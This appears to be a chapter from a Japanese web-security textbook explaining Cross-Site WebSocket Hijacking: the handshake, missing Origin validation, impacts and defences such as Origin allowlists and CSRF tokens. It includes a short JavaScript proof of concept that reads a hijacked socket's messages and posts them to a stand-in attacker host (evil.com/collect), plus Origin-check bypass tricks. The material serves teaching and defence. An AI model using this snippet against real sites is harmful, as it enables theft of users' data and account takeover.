## CSWSHの原理: Origin検証欠如とハンドシェイク

CSWSH（Cross-Site WebSocket Hijacking、クロスサイトWebSocketハイジャック）は、ひとことで言えば **「WebSocketのハンドシェイク（接続を確立する最初のHTTPリクエスト）に対するCSRF（クロスサイトリクエストフォージェリ）」** である。攻撃者が用意した悪意あるページを被害者が開いただけで、被害者のブラウザが被害者の認証情報（Cookieなど）を付けて標的サイトへWebSocket接続を張ってしまい、しかもその接続は攻撃者のJavaScriptから完全に制御できる——これがCSWSHの本質だ。

CSRFとの決定的な違いは **双方向性** にある。従来のCSRFは「攻撃者が被害者に代わって1回リクエストを送る（＝一方向の書き込み）」のが限界で、レスポンス本文は同一オリジンポリシー（SOP）によって攻撃者JSから読めない。ところがWebSocketは全二重（full-duplex）の通信路であり、CSWSHが成立すると攻撃者は **メッセージを送りつけるだけでなく、サーバから返ってくるメッセージも読み取れる**。つまり「操作」と「窃取」の両方が可能になる。ここがCSWSHを単なるCSRFの亜種ではなく、独立した重大クラスとして扱う理由である。

この章では、なぜこの攻撃が成立してしまうのかを **プロトコルとブラウザの挙動のレベル** で解剖する。核心は2点――「WebSocketハンドシェイクには標準の認証機構がない」ことと「WebSocketは同一オリジンポリシーの外にいる」こと――に尽きる。

### 前提知識: WebSocketハンドシェイクの仕組み

CSWSHを理解するには、まずWebSocket接続がどう始まるかを押さえる必要がある。WebSocket（RFC 6455）は、TCP上に全二重の双方向通信路を張るプロトコルだが、その接続確立は **通常のHTTP(S)リクエストから始まり、途中でプロトコルを「昇格（upgrade）」する** という独特の手順を踏む。

具体的には、ブラウザ（クライアント）が次のような **HTTP GETリクエスト** をサーバへ送る。これがハンドシェイクだ。

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
Origin: https://normal-website.com
```

各ヘッダの意味を分解する。

- **`Upgrade: websocket` / `Connection: Upgrade`**: このHTTPコネクションをWebSocketプロトコルへ昇格させたい、という宣言。
- **`Sec-WebSocket-Version: 13`**: 使用するWebSocketプロトコルのバージョン（RFC 6455は13）。
- **`Sec-WebSocket-Key`**: クライアントが生成するランダムなBase64値。ここが誤解されやすいが、**これは認証やセキュリティ用の値ではない**。PortSwiggerも明言している通り、この鍵は「キャッシュ（プロキシなどの中間装置）が古いWebSocketレスポンスを使い回すのを防ぐため」だけに存在する。サーバはこの値に固定文字列を連結してSHA-1でハッシュし、`Sec-WebSocket-Accept` として返すが、これは「相手が本当にWebSocketを解するサーバか」を確認するための握手（handshake）確認に過ぎず、クライアントの身元を保証するものではない。攻撃者のブラウザでも普通に生成される。
- **`Cookie: session=...`**: ここが問題の中心。**ハンドシェイクは通常のHTTPリクエストなので、ブラウザは対象ドメインのCookieを自動的に付与する。** 認証済みセッションCookieもここに載る。
- **`Origin: https://normal-website.com`**: このリクエストを開始したページのオリジン（スキーム＋ホスト＋ポート）を示すヘッダ。**CSWSH対策の主役となるのがこのヘッダだ。**

サーバがこの接続を受け入れると、次のように応答する。

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

ステータスコード **`101 Switching Protocols`** が返った時点で、このTCPコネクションはHTTPのリクエスト/レスポンス往復モデルを卒業し、以後はWebSocketのフレーム（メッセージ）を双方向にやり取りする通信路になる。一度確立すれば、クライアントとサーバはどちらからでも任意のタイミングでメッセージを送れる。

> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### 根本原因1: ハンドシェイクには標準の認証機構がない

CSWSHが生まれる第一の構造的原因は、**WebSocketプロトコル自体が「ハンドシェイク時にクライアントをどう認証するか」を一切定めていない** ことにある。

RFC 6455の原文は次のように述べている（Christian Schneiderの原典が引用しているもの）。

> "This protocol doesn't prescribe any particular way that servers can authenticate clients during the WebSocket handshake. The WebSocket server can use any client authentication mechanism available to a generic HTTP server, such as cookies, HTTP authentication, or TLS authentication."
>
> （このプロトコルは、WebSocketハンドシェイクの間にサーバがクライアントをどう認証するかについて特定の方法を規定していない。WebSocketサーバは、Cookie・HTTP認証・TLS認証など、一般的なHTTPサーバで利用可能なあらゆるクライアント認証機構を使ってよい。）

つまりプロトコルは「認証はHTTPの世界にある既存の仕組みで各自やってくれ」と丸投げしている。そして現実のアプリケーションの大半は、最も手軽な **Cookieベースのセッション認証** を選ぶ。

ここに罠がある。Cookieベース認証は、リクエストがどこ（どのオリジン）から発生したかに関係なく、ブラウザがCookieを自動送信することで成立する。これはまさに **古典的なCSRFが成立するのと同じ条件** だ。ハンドシェイクが「Cookieだけ」に依存し、リクエストパラメータの中に **攻撃者が推測できない値（＝CSRFトークン）** を含んでいなければ、そのハンドシェイクは偽造可能である。

PortSwiggerはCSWSHが成立する条件を、テスト観点として次のように定式化している。

> 攻撃者がCSWSHを実行するには、「セッション管理をHTTP Cookieだけに依存し、リクエストパラメータ内にトークンやその他の予測不可能な値を一切用いていないハンドシェイクメッセージ」を見つける必要がある。

先に示した脆弱なハンドシェイクの例を思い出してほしい。あの中で「攻撃者が事前に推測できない値」は `Sec-WebSocket-Key` くらいだが、前述の通りこれは認証と無関係でブラウザが勝手に生成する。セッションを守るはずの `session` Cookieはブラウザが自動付与する。**予測不可能なパラメータがどこにもない** ——これが「CSWSHに脆弱なハンドシェイク」の指紋である。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
>
> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### 根本原因2: WebSocketは同一オリジンポリシーの外にある

第二の、そしてより厄介な構造的原因は、**WebSocket接続が同一オリジンポリシー（Same-Origin Policy, SOP）によって制限されない** ことだ。

普段Webセキュリティを学ぶと、「別オリジンへのリクエストはSOPやCORS（Cross-Origin Resource Sharing）が守ってくれる」という感覚が身につく。たとえば `fetch()` で別オリジンにアクセスしても、サーバが適切なCORSヘッダを返さなければ **レスポンスを読み取れない**。この「レスポンスが読めない」という制約こそが、従来のCSRFを「一方向の書き込み」にとどめてきた。

ところがWebSocketにはこの防壁が **そもそも存在しない**。Christian Schneiderの原典はこの点を核心として指摘する。

> "WebSockets are not restrained by the same-origin policy."
>
> （WebSocketは同一オリジンポリシーによって制約されない。）

なぜか。SOP／CORSの仕組みはXMLHttpRequestや`fetch`といったHTTP APIのために設計されたものであり、WebSocket API（`new WebSocket(url)`）はその枠組みの外で規定されているからだ。攻撃者ページ `https://evil.com` に置かれたJavaScriptが `new WebSocket("wss://normal-website.com/chat")` を実行すると、ブラウザは何のクロスオリジン制限もかけずに接続を試みる。しかもハンドシェイクはHTTPリクエストなので、`normal-website.com` のCookieが自動的に付く。

その結果:

1. 攻撃者ページのJSが、被害者の認証済みセッションで標的へWebSocket接続を確立できる（＝ハンドシェイクの偽造＝CSRF部分）。
2. さらにCORSと違い、**確立した接続を通じて送受信するメッセージを攻撃者JSが自由に読み書きできる**（＝ハイジャック部分＝双方向性）。

この「SOPの外」という性質が、CSWSHを普通のCSRFより格段に危険にしている。CORSが `fetch` のレスポンス読み取りを塞ぐのと違い、WebSocketには読み取りを塞ぐ層がないため、`onmessage` イベントで受け取ったデータをそのまま攻撃者サーバへ送り出せてしまう。

Christian Schneiderが挙げる典型シナリオはこうだ。株取引アプリ `wss://www.some-trading-application.com/trading/ws/stockPortfolio` に被害者がログイン中、別タブで攻撃者ページを開くと、攻撃者はこの認証済みWebSocketを勝手に開き、ポートフォリオ情報を読み取ったり、勝手に売買注文のメッセージを送ったりできる。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/

#### なぜOriginヘッダが「唯一で最後の砦」になるのか

ここで冒頭のハンドシェイクにあった `Origin` ヘッダが効いてくる。SOPがWebSocketを守らない以上、**「このハンドシェイクはどのサイトから発生したか」をサーバ側で判断する材料は `Origin` ヘッダしかない**。

`Origin` ヘッダはブラウザが自動的かつ強制的に設定するヘッダで、JavaScriptから改ざんできない（`fetch` のカスタムヘッダのように上書きできない、ブラウザ管理下の「forbidden header」）。したがって攻撃者ページ `https://evil.com` からWebSocketを開けば、ハンドシェイクには必ず `Origin: https://evil.com` が付く。

**サーバがこの `Origin` を検証し、自分の許可したオリジン（例: `https://normal-website.com`）でなければ接続を拒否すれば、CSWSHは防げる。** 逆に言えば、`Origin` を検証していない（＝Origin検証欠如）サーバは、どのサイトから来たハンドシェイクでも受け入れてしまうため、CSWSHに脆弱になる。

この「Origin検証の欠如」という欠陥は、後にCWE（Common Weakness Enumeration）として正式に分類された。

- **CWE-1385: Missing Origin Validation in WebSockets（WebSocketにおけるOrigin検証の欠如）** ――2013年のChristian Schneiderの研究を契機に整理された脆弱性区分。

注意すべきは、Origin検証は「ゆるい実装」だと簡単に破られる点だ。よくある不完全な検証の例:

- **前方一致・部分一致で判定** → `https://normal-website.com.evil.com` や `https://evil-normal-website.com` を通してしまう。
- **`null` オリジンを許可** → `sandbox` 属性付き`iframe`やある種のリダイレクトで `Origin: null` を作れる場合、素通りする。
- **Originヘッダの欠如を「許可」として扱う** → 一部の非ブラウザクライアントやプロキシ経由でヘッダが落ちたケースを、誤って信頼済みと判定する。

したがって正しいOrigin検証は「許可リスト（allowlist）による厳密な完全一致」であるべきだ。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
>
> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### 攻撃の全体像（防御を理解するための原理説明）

ここまでの原理を統合すると、CSWSHが成立するときの流れは次のようになる。**本節はあくまで「なぜ防御が必要か」を理解するための仕組みの説明であり、実在サービスへの無許可の検証を推奨するものではない。**

1. **被害者が標的サイトにログイン中**（認証Cookieがブラウザに存在する）。
2. 被害者が **攻撃者の用意したページ** を開く（メール・SNS・広告経由など）。
3. 攻撃者ページのJavaScriptが標的サイトへWebSocket接続を開始する。ハンドシェイクには被害者のCookieが自動付与される（原因1）。SOPは接続を止めない（原因2）。
4. 標的サーバが `Origin` を検証していない（Origin検証欠如）ため、`Origin: https://evil.com` のハンドシェイクを受理し、`101 Switching Protocols` を返す。
5. 攻撃者JSは確立した認証済みWebSocket上で、任意メッセージを **送信**（不正操作）でき、サーバからのメッセージを **受信して読み取り**（データ窃取）、それを攻撃者サーバへ転送できる。

概念を示す最小限のクライアントJavaScript（攻撃者ページ側の考え方を理解するための擬似コード）は次のようになる。標的の実装により「接続直後に何を送ればデータが返るか」は異なるため、ここでは原理の骨格のみを示す。

```javascript
// 攻撃者ページ evil.com 上で動作するJS（原理説明用の擬似コード）
var ws = new WebSocket("wss://normal-website.com/chat");
// ↑ SOPに阻まれず接続開始。ブラウザが normal-website.com のCookieを自動付与するため
//   被害者の認証済みセッションでハンドシェイクが成立してしまう（Origin未検証の場合）。

ws.onopen = function () {
  // 多くのチャット/通知系WSは、接続後に「履歴をくれ」等のメッセージを送ると過去データを返す。
  ws.send("READY");
};

ws.onmessage = function (event) {
  // ★ ここが従来CSRFとの決定的な差。
  //   SOP/CORSに阻まれず、サーバからのメッセージ本文を攻撃者JSが読める。
  fetch("https://evil.com/collect", {
    method: "POST",
    body: event.data,          // 窃取したデータを攻撃者サーバへ送信
    mode: "no-cors"
  });
};
```

**なぜこう書けるのか** ――`new WebSocket()` がSOPの外で動く（原因2）から接続が張れ、Cookieが自動付与される（原因1）から認証を突破でき、`onmessage` で本文が読める（SOP非適用の帰結）から窃取が成立する。この3つが揃って初めて成立する点が重要で、裏を返せば **どれか1つでも塞げば防げる**。

### 影響: 「操作」と「窃取」の両取り

PortSwiggerはCSWSHの影響を2カテゴリに整理している。

- **不正な操作（Unauthorized actions）**: サーバ側の機微な操作がクライアント発のメッセージで駆動される設計だと、攻撃者は「サーバへ任意のメッセージを送信」してそれらの操作を起動できる。例: 設定変更、送金・注文、メッセージ投稿など。
- **データの傍受（Data interception）**: 標準的なCSRFと違い、ハイジャックしたWebSocket上で「アプリケーションと双方向にやり取り」できるため、サーバから被害者に向けて流れるメッセージを「傍受し、被害者ユーザーのデータを取得」できる。例: チャット履歴、通知、トークン、個人情報など。

この双方向性ゆえに、CSWSHは条件次第で **アカウント乗っ取り（ATO）** にまで発展する。実際、WebSocket経由でワークスペース／アカウントが乗っ取られた事例として **CVE-2023-0957（Gitpod）** が知られる。CSWSHのようにOrigin検証欠如を突く脆弱性は近年も継続的に報告されており（例として CVE-2024-51775、CVE-2025-48068 など）、「古い2013年の話」ではなく現役の脅威である点に注意したい。

> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
>
> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/

### 防御: 原因を1つずつ塞ぐ

CSWSHの防御は、これまで見た「根本原因」に一対一で対応させると理解しやすい。Christian Schneiderの原典は主に2つの対策を挙げ、加えて根本的な代替案を示している。

#### 対策1: Originヘッダの厳密な検証（Origin検証欠如を塞ぐ）

サーバはハンドシェイク時に `Origin` ヘッダを検査し、**許可リスト（allowlist）に完全一致するオリジンだけ** を受理する。前述の通り、部分一致・前方一致・`null`許可・ヘッダ欠如の黙認は避ける。これは「原因2（SOPの外）」を人力で埋める措置に相当する。

```python
# 概念例: ハンドシェイク受理前にOriginを完全一致で検証する（原理説明用）
ALLOWED_ORIGINS = {"https://normal-website.com"}

def on_handshake(request):
    origin = request.headers.get("Origin")
    if origin not in ALLOWED_ORIGINS:   # 部分一致でなく集合の完全一致で判定
        reject_connection(403)          # ← Origin未許可なら接続を拒否
        return
    accept_connection()
```

ただしOriginヘッダはブラウザ発のリクエストにしか付かない（≒ブラウザ以外のクライアントは自由に詐称できる）ため、これ単独を全信頼の根拠にはできない。CSWSHは「被害者のブラウザを踏み台にする」攻撃なので、ブラウザ経由のCSWSH対策としてはOrigin検証が有効に効く一方、認証そのものは次のトークン方式で担保するのが堅牢だ。

#### 対策2: CSRFトークン方式（ハンドシェイクにセッション固有の乱数を要求する＝原因1を塞ぐ）

ハンドシェイクのパラメータに **セッションごとにランダムなトークン** を含めることを必須とし、サーバがそれを検証する。攻撃者ページはこのトークン値を知り得ない（SOPにより標的サイトのDOM/レスポンスから読めない）ため、正しいハンドシェイクを組み立てられず、偽造が失敗する。これは古典的なCSRF対策をWebSocketハンドシェイクに持ち込んだものだ。「原因1（Cookieだけに依存する認証）」を直接無効化する。

#### 対策3（根本策）: Webセッションに依存しないトークン認証をWebSocket内で行う

Christian Schneiderが挙げる最も堅牢な代替案は、**そもそもWebSocketエンドポイントからWebセッション（Cookie）を参照しない** ことだ。代わりに、WebSocketプロトコルの内側で独自のトークンベース認証・認可を実装する。すなわち:

- ハンドシェイクのCookieに認証を頼らず、
- 接続確立後（またはハンドシェイクのパラメータ）で、アプリが発行した短命なアクセストークンを提示させ、それを検証する。

こうすると「ブラウザがCookieを自動付与する」という原因1のトリガーそのものが認証に効かなくなるため、CSWSHの前提が崩れる。設計段階で採用できるなら最も安全な方向性である。

##### 補助策

- **メッセージ本文の設計**: 機微な操作はクライアント発の単純なメッセージだけでは駆動しない（サーバ側で追加の認可・検証を行う）。
- **TLS（wss://）の使用**: 平文 `ws://` は経路上での盗聴・改ざんに晒される。CSWSH対策とは別軸だが、WebSocketセキュリティの基本として `wss://` を徹底する。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
>
> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### HackTricksによるハンドシェイク詳細（未取得のため補足）

> ⚠️ **未取得の資料**: 「HackTricks — Cross-Site WebSocket Hijacking (CSWSH)」は自動取得できませんでした（理由: ミラーサイト `hacktricks.boitatech.com.br` はTLS証明書のホスト名不一致で接続不可、正規サイト `book.hacktricks.wiki` はTollbit経由の `HTTP 402 Payment Required` で本文取得がブロックされたため）。以下のURLからご自身で直接ご覧ください: https://book.hacktricks.wiki/en/pentesting-web/cross-site-websocket-hijacking-cswsh.html （元指定URL: https://hacktricks.boitatech.com.br/pentesting-web/cross-site-websocket-hijacking-cswsh ）

（以下は未取得資料の補足として一般知識に基づく解説です）

HackTricksのCSWSHページは、実務的なテスト観点として概ね次の内容をまとめている（本教科書の他資料と整合する範囲での一般的な要約）。

- **脆弱なハンドシェイクの見分け方**: ハンドシェイクリクエストを傍受し、認証がCookieだけに依存していて、パラメータにCSRFトークン相当の予測不可能値がないことを確認する。前掲のPortSwiggerの指紋と同じ観点である。
- **`Origin` を改変して挙動を観察する**: ハンドシェイクの `Origin` ヘッダを別ドメインに書き換えても `101 Switching Protocols` が返り接続が確立するなら、Origin検証が欠如している疑いが強い。逆に許可オリジン以外を拒否するなら検証が効いている。
- **`Sec-WebSocket-Key` は認証ではない**: この値はキャッシュ回避用でありセキュリティ上意味を持たない、という点をHackTricksも強調する（PortSwiggerと同旨）。
- **PoCの骨格**: `new WebSocket()` で標的へ接続し、`onmessage` で受信データを攻撃者サーバへ送出する、本章で示したものと同型のクライアントJSを用いる。
- **検証環境の原則**: これらの確認は、自分が権限を持つ検証用環境（ローカルの脆弱アプリや、許可されたバグバウンティ対象）に限定して行うべきである。実在サービス・本番環境への無許可の検証は行わない。

正確な最新の手順・コードは、上記URLの原文を直接参照されたい。

### まとめ

CSWSHは、次の3つの事実が重なったときに成立する「WebSocketハンドシェイクへのCSRF」である。

1. **ハンドシェイクは通常のHTTPリクエスト** なので、ブラウザが認証Cookieを自動付与する（RFC 6455が認証方式を規定していない結果、Cookie認証が使われがち）。
2. **WebSocketは同一オリジンポリシーの外** にあるため、クロスオリジン接続が阻まれず、しかもメッセージ本文を攻撃者JSが読める（双方向性＝CSRFより危険）。
3. **サーバが `Origin` を検証していない**（Origin検証欠如＝CWE-1385）ため、攻撃者ページ発のハンドシェイクを受理してしまう。

防御はこの3点に対応する。**Originの厳密な許可リスト検証**、**ハンドシェイクへのCSRFトークン要求**、そして根本策として **WebSocketセッションをCookieに依存させず独自トークンで認証する** こと。`Sec-WebSocket-Key` はキャッシュ回避用でセキュリティには寄与しないという点も、初学者が誤解しやすいので押さえておきたい。次節以降では、この原理を踏まえた具体的な検出手法と、メッセージ経由のインジェクションなど発展的な論点を扱う。
